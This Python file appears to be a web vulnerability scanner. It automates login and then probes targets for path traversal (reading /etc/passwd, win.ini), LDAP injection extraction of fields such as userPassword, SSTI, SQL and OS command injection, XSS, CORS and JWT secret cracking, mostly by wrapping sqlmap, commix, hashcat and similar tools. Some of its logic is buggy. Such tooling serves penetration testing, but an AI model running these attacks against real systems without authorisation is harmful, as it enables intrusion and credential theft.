import sqlite3
import sys
import requests
from bs4 import BeautifulSoup
from urllib.parse import parse_qs
from urllib.parse import urlparse, urlunparse,urlencode
import re
import subprocess
import base64
import threading
import json


proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'https://127.0.0.1:8080'
}
def get_session(loginurl,userparam,passparam,csrfparam,username,password):
    # Set up a session
    login_data = {
        userparam: username,
        passparam: password,
    }
    session = requests.Session()

    # Send a GET request to retrieve the login page
    response = session.get(loginurl,verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    button_element = soup.find('button')
    if button_element:
    # Get the name and value attributes of the button
        if button_element.get('name'):
            button_name = button_element.get('name')
            if button_element.get('value'):
                button_value = button_element.get('value')
                login_data[button_name] = button_value
    # Extract the CSRF token from the login form\
    loginname = ''
    loginvalue = ''
    csrf_token = ''
    try :
        csrf_token = soup.find('input', {'name': csrfparam}).get('value')
        login_data[csrfparam] = csrf_token
    except :
        print("nothings")
    try :
        loginvalue = soup.find('input', {'type': 'submit'}).get('value')
        loginname = soup.find('input', {'type': 'submit'}).get('name')
        login_data[loginname] = loginvalue
    except:
        print("nothings")
        # Send a POST request to the login page with the login data
    response = session.post(loginurl, data=login_data,verify=False)
    # Check if the login was successful by analyzing the response

    return session
def extract_form_parameters(url,loginurl,userparam,passparam,csrfparam,username,password):

    session = get_session(loginurl,userparam,passparam,csrfparam,username,password)
    response = session.get(url,verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    parameters = {}
    newurl = ''
    try : 
        form = soup.find('form',method='GET')
        if form is None :
            form = soup.find('form',method='get')
        action = form.get('action')
        method = form.get('method', 'GET')
        inputs = form.find_all(['input', 'select','textarea'])

        for input_tag in inputs:
            name = input_tag.get('name')
            value = input_tag.get('value', '')

            if name:
                parameters[name] = value
    except:
        print("no parameter get")
    for param in parameters:
        if method == 'GET':
            temp = session.get(url,params=parameters,verify=False)
            newurl = temp.url
    print('params',parameters)
    print('new :',newurl)
    return parameters
def extract_post_parameters(url,loginurl,userparam,passparam,csrfparam,username,password):
    session = get_session(loginurl,userparam,passparam,csrfparam,username,password)
    response = session.get(url,verify=False)
    print(response.url)
    parameters = {}
    urlcontain = ''
    soup = BeautifulSoup(response.text, 'html.parser')
    try :
        forms = soup.find_all('form', method='POST')
        if len(forms) == 0:
            forms = soup.find_all('form', method='post')
        for form in forms:
            method = form.get('method', 'post')
            inputs = form.find_all(['input', 'select','textarea'])
            for input_tag in inputs:
                if input_tag.name == 'input':
                    name = input_tag.get('name')
                    value = input_tag.get('value', '')
                    if name and name not in parameters:
                        parameters[name] = value
                elif input_tag.name == 'textarea':
                    name = input_tag.get('name')
                    value = input_tag.get('value', '')
                    if name and name not in parameters:
                        parameters[name] = value
                elif input_tag.name == 'select':
                    name = input_tag.get('name')
                    selected_option = input_tag.find('option', selected=True)
                    value = selected_option.get('value', '') if selected_option else ''
                    if name and name not in parameters:
                        parameters[name] = value
    except:
        print("not post")
    if parameters:
        if method == 'POST':       
            postdata = session.post(url, params=parameters,verify=False)
            print('POST :',postdata.url)
            urlcontain = postdata.url
    return parameters
 

def path_travel_scan(scanurl,loginurl,userparam,passparam,csrfparam,username,password):
    session = get_session(loginurl,userparam,passparam,csrfparam,username,password)
    parsed_url = urlparse(scanurl)
    query_params = parse_qs(parsed_url.query)
    print(query_params)
    filepath = './src/payload/rfi.txt'
    linux_file_paths = [
        "/etc/passwd",
        "/etc/hosts","/etc/passwd%00",
        "/etc/hosts%00",
        "/etc/passwd%00.jpg",
        "/etc/hosts%00.jpg",
        
    ]

    windows_file_paths = [
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini%00",
        "C:\\Windows\\System32\\drivers\\etc\\hosts%00",
        "C:\\Windows\\win.ini%00.jpg",
        "C:\\Windows\\System32\\drivers\\etc\\hosts%00.jpg",
    ]
    with open(filepath) as fp:
        line = fp.readline()
        while line:
            combined = line.strip()
            for param in query_params:
                if param != 'Submit' or param != 'Confirm':
                    for linux in linux_file_paths:
                        query_params[param] = combined + linux
                        updated_query = urlencode(query_params, doseq=True)
                        new_url_parts = list(parsed_url)
                        new_url_parts[4] = updated_query
                        new_url = urlunparse(new_url_parts)
                        print(new_url)
                        rs = session.get(new_url,verify=False)
                        if "root:" in rs.text:
                            print('FOUND RFI in payload',query_params[param])
                            return True
                        else:
                            print('NOT FOUND RFI')
                    for window in windows_file_paths:
                        query_params[param] = combined + linux
                        updated_query = urlencode(query_params, doseq=True)
                        new_url_parts = list(parsed_url)
                        new_url_parts[4] = updated_query
                        new_url = urlunparse(new_url_parts)
                        print(new_url)
                        rs = session.get(new_url,verify=False)
                        print(query_params)
                        if "Windows" in rs.text:
                            print('FOUND RFI in payload',query_params[param])
                            return True
                        else:
                            print('NOT FOUND RFI')
            line = fp.readline()
    print(query_params)
    
def check_url_valid(url):
    req = requests.get(url)
    if req.status_code == 404:
        return False
    else :
        return True

def scan_hidden_path(url):
    dirsearch_command = f"python3 tool/dirsearch/dirsearch.py -u {url} --delay=0.5"

    process = subprocess.Popen(dirsearch_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    stdout, stderr = process.communicate()

    output = stdout.decode('utf-8')

    # Filter lines with status code
    result_lines = [line for line in output.splitlines() if "200" in line and '%' not in line]
    result = ''
    for line in result_lines:
        result = result + line
    return result

def scan_component(url):
    from Wappalyzer import Wappalyzer, WebPage
    wappalyzer = Wappalyzer.latest()
    webpage = WebPage.new_from_url(url)
    result = wappalyzer.analyze_with_versions_and_categories(webpage)

    return result

def scan_crlf(url, method):
    hashcat_command = f"crlfuzz -u {url} -X {method} -v"
    process = subprocess.Popen(hashcat_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    output = stdout.decode('utf-8')
    result = ''

    # Filter lines with status code
    result_lines_out = [line for line in output.splitlines() if "VLN" in line]

    for line in result_lines_out:
        result = result + line

    errorput = stderr.decode('utf-8')

    # Filter lines with status code
    result_lines_err = [line for line in errorput.splitlines() if "VLN" in line]

    for line in result_lines_err:
        result = result + line
    return result

def scan_OS_cmd(req, number_param):

    base64_bytes = req.encode("utf-8") 
  
    sample_string_bytes = base64.b64decode(base64_bytes) 
    sample_string = sample_string_bytes.decode("utf-8")

    file1 = open('./tool/commix/test.txt', 'w')
    file1.writelines(sample_string)
    
    # Closing file
    file1.close()

    commix_command = "python3 ./tool/commix/commix.py -r ./tool/commix/test.txt --batch"

    process = subprocess.Popen(commix_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    while True:
        count = 0
        output = process.stdout.readline()
        if output == '' and process.poll() is not None:
            break
        if output:
            print(output.strip())
            match = re.search(r"\|_ (.+)\\x", str(output.strip()))
            if match:
                result1 = match.group(1)
                result1 = ("Payload: " + result1)
        if re.search(r"parameter '(\w+)' is vulnerable", str(output.strip())):
            match = re.search(r"parameter '(\w+)' is vulnerable.", str(output.strip()))
            result = match.group(0)
            break
        if re.search(r"All tested parameters appear to be not injectable", str(output.strip())):
            return "No OS comand found"
        if re.search(r"Unable to connect to the target URL", str(output.strip())):
            return "No OS comand found"
        if re.search(r"does not seem to be injectable", str(output.strip())):
            count = count + 1
        if count == number_param:
            return "No OS comand found"
    return result + result1


def scan_SQLi(req):
    write_file(req)
    flag = False
    sqlmap_path = r"./tool/sqlmap/sqlmap.py"
    sqlmap_output = r"./src/temp_output.txt"
    file_request = r"./tool/commix/test.txt"
    # Construct the command as a list
    command = ["python3", sqlmap_path, "-r", f"{file_request}", "--answers='follow=Y'", "--batch"]
    # tamper,level,risk

    # Execute the command and capture the output
    result = subprocess.run(command, capture_output=True, text=True)


    # Check if the command was successful
    if result.returncode == 0:
        print("Command executed successfully.")
        # Write the output to a file
        with open(sqlmap_output, 'w') as output_file:
            output_file.write(result.stdout)
    else:
        print(f"Error: {result.stderr}")

    # analysis file result
    with open(sqlmap_output, 'r') as file:
        # Đọc từng dòng của tệp
        for line in file:
        # Sử dụng biểu thức chính quy để kiểm tra xem dòng có chứa pattern mong muốn không
            match1 = re.search(r"parameter '(\w+)' is vulnerable", line)
            match2 = re.search(r"sqlmap resumed the following injection point\(s\) from stored session:", line)
            if match1:
                # Nếu có, in thông báo và đặt flag để in ra màn hình
                parameter_id = match1.group(1)
                print(f"Found vulnerable parameter: {parameter_id}")
                flag = True
            elif match2:
                print("Found vulnerable parameter")
                flag = True
    if flag:
        with open(sqlmap_output, 'r') as file:
        # Đọc từng dòng của tệp
            start_writing = False
            with open(r'src/temp_database.txt', 'w') as output:
                for line in file:
                    # Kích hoạt cờ khi gặp dòng '---'
                    if line.strip() == '---':
                        if start_writing:
                            break  # Dừng ghi nếu đã kết thúc nội dung cần ghi
                        start_writing = not start_writing
                        continue

                    # Nếu cờ được kích hoạt, ghi vào file output
                    if start_writing:
                        output.write(line)
    else:
        print("Scanned For SQLi Vulnerabilities: Not Found")
        return "Scanned For SQLi Vulnerabilities: Not Found"
            
    with open(r'src/temp_database.txt', 'r') as output:
        content = output.read()
        return content

def write_file(req):
    # base64_bytes = req.encode("utf-8") 
  
    sample_string_bytes = base64.b64decode(req) 
    sample_string = sample_string_bytes.decode('utf-8')

    file1 = open('./tool/commix/test.txt', 'w')
    file1.writelines(sample_string)
    
    # Closing file
    file1.close()

def write_file_respon(respon):
    base64_bytes = respon.encode("utf-8") 
  
    sample_string_bytes = base64.b64decode(base64_bytes) 
    sample_string = sample_string_bytes.decode("utf-8")

    file1 = open('./tool/commix/respon.txt', 'w')
    file1.writelines(sample_string)
    
    # Closing file
    file1.close()

def scan_CORS(req, url):
    write_file(req)

    cookie = ''
    with open("./tool/commix/test.txt", 'r') as output:
        for line in output:
            if re.search(r"Cookie", str(line.strip())):
                cookie = line.strip()

    Corsy_command = f"python3 tool/Corsy/corsy.py -u {url} --headers '{cookie}'"

    process = subprocess.Popen(Corsy_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
    for line in iter(process.stdout.readline, b''):
        if 'No misconfigurations' in line:
            return 'No misconfigurations request'
    return "Scan CORS - Access-Control-Allow-Credentials found"

def find_comments(response_text):
    write_file_respon(response_text)

    with open(r"src/respon.txt", 'r') as file_read:
        response = file_read.read()

    
    # Biểu thức chính quy để tìm đoạn comment trong response
    comment_pattern = re.compile(r'<!--(.*?)-->', re.DOTALL)

    # Tìm tất cả các đoạn comment trong response
    comment_matches = re.findall(comment_pattern, response)

    if (enumerate(comment_matches) > 0):
        with open(r'src/temp_database.txt', 'w') as output:
            for i, comment in enumerate(comment_matches, 1):
                print(f"Comment {i}:\n{comment}\n{'='*30}")                        
                output.write(f"Comment {i}:\n{comment}\n{'='*30}")
    else:
        print("Scanned Find Comment : Not Found")
        return "Scanned Find Comment : Not Found"       
            
    with open(r'src/temp_database.txt', 'r') as output:
        content = output.read()
        return content
        

def find_javascript_code(response_text):
    write_file_respon(response_text)

    with open("./tool/commix/respon.txt", 'r') as file_read:
        response = file_read.read()

    # Biểu thức chính quy để tìm đoạn mã JavaScript trong response
    javascript_pattern = re.compile(r'<script\b[^>]*>(.*?)<\/script>', re.DOTALL | re.IGNORECASE)

    # Tìm tất cả các đoạn mã JavaScript trong response
    javascript_matches = re.findall(javascript_pattern, response)

    for javascript_code in javascript_matches:
        print(f"\n{javascript_code}\n")
        
    if (enumerate(javascript_matches) > 0):
        with open(r'src/temp_database.txt', 'w') as output:
            for i, javascript_code in enumerate(javascript_matches, 1):
                print(f"Script {i}:\n{javascript_code}\n{'='*30}")                        
                output.write(f"Script {i}:\n{javascript_code}\n{'='*30}")
    else:
        print("Scanned Find Java Script : Not Found")   
        return "Scanned Find Java Script : Not Found"                          
            
    with open(r'src/temp_database.txt', 'r') as output:
        content = output.read()
        return content
    
        
def open_data(filename):
  with open(filename,"r") as f:
    data = json.load(f)
    f.close()
  print(f"[+]{len(data)} PAYLOAD LOADED")
  return data

def scan_SSTI(method, params, url):
    data = open_data("./src/payload/payload_ssti.json")
    final_param = {}
    flag = False
   
    if method == "POST" or method == "GET":
        for payloads in data:
            if isinstance(params, str):
                final_param[params] = payloads["payload"]
            elif isinstance(params, list):
                for param in params:
                    final_param[param] = payloads["payload"]

            if method == "POST":
                response = requests.post(url=url, data=final_param).text
            elif method == "GET":
                response = requests.get(url=url, params=final_param).text

            if isinstance(payloads['output'], list):
                for i in payloads['output']:
                    if i in response:
                        flag = True
                        print(f"Found Vulnerable SSTI\nURL:{url}\nPAYLOAD:{payloads['payload']}\n------------------")
                        with open(r'src/temp_database.txt', 'w') as output:
                            output.write(f"Found Vulnerable SSTI\nURL:{url}\nPAYLOAD:{payloads['payload']}\n------------------")
                        continue
            else:
                if payloads['output'] in response:
                    flag = True
                    print(f"Found Vulnerable SSTI\nURL:{url}\nPAYLOAD:{payloads['payload']}")
                    with open(r'src/temp_database.txt', 'w') as output:
                        output.write(f"Found Vulnerable SSTI\nURL:{url}\nPAYLOAD:{payloads['payload']}")


            final_param = {}
        if(flag == False):
            print("Scanned For SSTI Vulnerabilities: Not Found")
            return "Scanned For SSTI Vulnerabilities: Not Found"
        
        with open(r'src/temp_database.txt', 'r') as output:
            content = output.read()
            return content
        
            

def scan_open_redirect(url):

    url = "https://bwapp.hakhub.net/unvalidated_redir_fwd_1.php?url="
    # Run OS command oralyzer
    # python oralyzer.py -l test.txt (command)
    open_redirect_path = "./tool/Oralyzer/oralyzer.py"
    open_redirect_output = "./tool/Oralyzer/output.txt"

    # Construct the command as a list
    command = ["python3", open_redirect_path, "-l", url]
    # tamper,level,risk

    # Execute the command and capture the output
    result = subprocess.run(command, capture_output=True, text=True)

    # Check if the command was successful
    if result.returncode == 0:
        print("Command executed successfully.")
        # Write the output to a file
        with open(open_redirect_output, 'w') as output_file:
            output_file.write(result.stdout)
    else:
        print(f"Error: {result.stderr}")

    # analysis file result
    start_writing = False
    with open(open_redirect_output, 'r') as file:
        # Đọc từng dòng của tệp
        for line in file:
        # Sử dụng biểu thức chính quy để kiểm tra xem dòng có chứa pattern mong muốn không
            if "Header Based Redirection" in line:
                # Nếu có thì in ra màn hình
                print("\033[91mFound vulnerable\033[0m")
                print(line.strip())
                break

def check_http_method(url):
    try:
        response = requests.request('OPTIONS', url)
        actual_method = response.headers.get('allow', '').upper()
        if len(actual_method):
            print(f"Actual_method: {actual_method}")
            return f"Actual_method: {actual_method}"
        else:
            print("Scanned For Http Method: Not Found")
            return "Scanned For Http Method: Not Found"
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")


def check_http_https(url):
    if "http" in url:
        print("Scanned For Http_Https: Allow HTTP.")
        return "Scanned For Http_Https: Allow HTTP."
    
    input_string = url
    regex_pattern = r'https?://([a-zA-Z0-9.-]+)'
    match = re.search(regex_pattern, input_string)

    if match:
        result = match.group(1)
        url_result = "http://" + result

    try:
        response = requests.get(url_result, timeout=500)
        if response.status_code == 200:
            print("Scanned For Http_Https: Allow HTTP.")
            return "Scanned For Http_Https: Allow HTTP."
        else:
            print("Scanned For Http_Https: Not Allow HTTP")
            return "Scanned For Http_Https: Not Allow HTTP"
    except requests.RequestException:
        pass

def decode_base64(string):
    base64_bytes = string.encode("utf-8") 
  
    sample_string_bytes = base64.b64decode(base64_bytes) 
    sample_string = sample_string_bytes.decode("utf-8")
    return sample_string

def scan_LDAP_fields(url):
    #!/usr/bin/python3
    import requests
    import string
    from time import sleep
    import sys

    proxy = { "http": "localhost:8080" }
    alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

    attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

    result = ''
    for attribute in attributes: #Extract all attributes
        value = ""
        finish = False
        while not finish:
            for char in alphabet: #In each possition test each possible printable char
                query = f"*)({attribute}={value}{char}*"
                data = {'login':query, 'password':'pass'}
                r = requests.post(url, data=data, proxies=proxy)
                sys.stdout.write(f"\r{attribute}: {value}{char}")
                #sleep(0.5) #Avoid brute-force bans
                if "Cannot login" in r.text:
                    value += str(char)
                    break

                if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
                    finish = True
                    print() 

def scan_LDAP_Blind(url):
    #!/usr/bin/python3

    import requests, string
    alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

    flag = ""
    for i in range(50):
        print("[i] Looking for number " + str(i))
        for char in alphabet:
            r = requests.get(url + flag + char)
            if ("TRUE CONDITION" in r.text):
                flag += char
                print("[+] Flag: " + flag)
                break
    return "[+] Flag: " + flag

def scan_XSS(url, number_param):
    xsstrike_command = f"python3 ./tool/XSStrike/xsstrike.py -u '{url}'"

    process = subprocess.Popen(xsstrike_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, bufsize=1)
    for line in iter(process.stdout.readline, ''):
        count = 0
        if 'Payload:' in line:
            return line
        if 'No parameters to test' in line:
            return "No XSS found"
        if "No reflection found" in line:
            count = count + 1
        if count == number_param:
            return "No XSS found"

def is_jwt_used(req):

    write_file(req)

    with open("./tool/commix/test.txt", 'r') as file:
        content = file.read()
        jwt_pattern = re.compile(r'\b([A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]+)\b')
        matches = jwt_pattern.findall(content)
        result = ''
        
        if matches:
            for i, match in enumerate(matches, start=1):
                if '=' in match:
                    jwt = match.split('=')[1]
                    jwt_command = f"python3 ./tool/jwt_tool/jwt_tool.py {jwt}"
                    process = subprocess.Popen(jwt_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = process.communicate()
                    output = stdout.decode('utf-8')
                    # Filter lines with status code
                    result_lines_out = [line for line in output.splitlines() if "alg" in line]
                    if len(result_lines_out) != 0:
                        result = jwt
                        return result
                else:
                    jwt = match
                    jwt_command = f"python3 ./tool/jwt_tool/jwt_tool.py {jwt}"
                    process = subprocess.Popen(jwt_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = process.communicate()
                    output = stdout.decode('utf-8')
                    # Filter lines with status code
                    result_lines_out = [line for line in output.splitlines() if "alg" in line]
                    if len(result_lines_out) != 0:
                        result = jwt
                        return result

def scan_JWT_Token(req):

    token = is_jwt_used(req)
    if token is None:
        return "No JWTs found in the request."

    hashcat_command = f"hashcat -a 0 -m 16500 {token} /usr/share/wordlist/jwt_secrets_list.txt"

    process = subprocess.Popen(hashcat_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    stdout, stderr = process.communicate()

    output = stdout.decode('utf-8')
    # Filter lines with status code
    result_lines_out_not_found = [line for line in output.splitlines() if "Approaching final keyspace" in line]
    if len(result_lines_out_not_found) != 0:
        return "Can not crack JWT."
    
    result_lines_out = [line for line in output.splitlines() if f"{token}" in line]
    result_string = '\n'.join(result_lines_out)

    return result_string
    
def has_same_site_attribute(req):
    write_file(req)
    file_path = r'./tool/commix/test.txt'  # Thay thế bằng đường dẫn thực tế của bạn
    with open(file_path, "r") as file:
        request_content = file.read()

    # Tìm và kiểm tra thông tin về Cookie trong yêu cầu
    for line in request_content:
        if line.startswith("Cookie:"):
            cookie_header = line.strip()

            # Kiểm tra xem có thuộc tính SameSite không
            if 'SameSite' in cookie_header:
                samesite_attribute = cookie_header.split(';')[1].strip()
                
                # Kiểm tra giá trị của thuộc tính SameSite
                if 'SameSite=None' in samesite_attribute:
                    print("SameSite attribute is present and set to None.")
                    return "SameSite attribute is present and set to None."
                else:
                    print("SameSite attribute is present.")
                    return "SameSite attribute is present."
            else:
                print("SameSite attribute is not present in the Cookie header.")
                return "SameSite attribute is not present in the Cookie header."

def has_httponly_attribute(req):
    write_file(req)

    with open("./tool/commix/test.txt", 'r') as file_read:
        cookie_header = file_read.read()

    # Chia header cookie thành các cặp key-value
    cookie_attributes = [attribute.strip().split('=') for attribute in cookie_header.split(';')]

    # Tìm kiếm thuộc tính httponly trong danh sách các cặp key-value
    httponly_attribute = next((attr for attr in cookie_attributes if attr[0].lower() == 'httponly'), None)

    if httponly_attribute:
        print("Cookie httponly attribute.")
        return "Scanned cookies httponly: Cookie httponly attribute."
    else:
        print("Cookie not httponly attribute.")
        return "Scanned cookies httponly: Cookie not httponly attribute."
    
def has_secure_attribute(req):
    write_file(req)

    with open("./tool/commix/test.txt", 'r') as file_read:
        cookie_header = file_read.read()

    # Chia header cookie thành các cặp key-value
    cookie_attributes = [attribute.strip().split('=') for attribute in cookie_header.split(';')]

    # Tìm kiếm thuộc tính secure trong danh sách các cặp key-value
    secure_attribute = next((attr for attr in cookie_attributes if attr[0].lower() == 'secure'), None)

    if secure_attribute:
        print("Cookie secure attribute.")
        return "Scanned cookie attribute: Cookie secure attribute."
    else:
        print("Cookie not secure attribute.")
        return "Scanned cookie attribute: Cookie not secure attribute."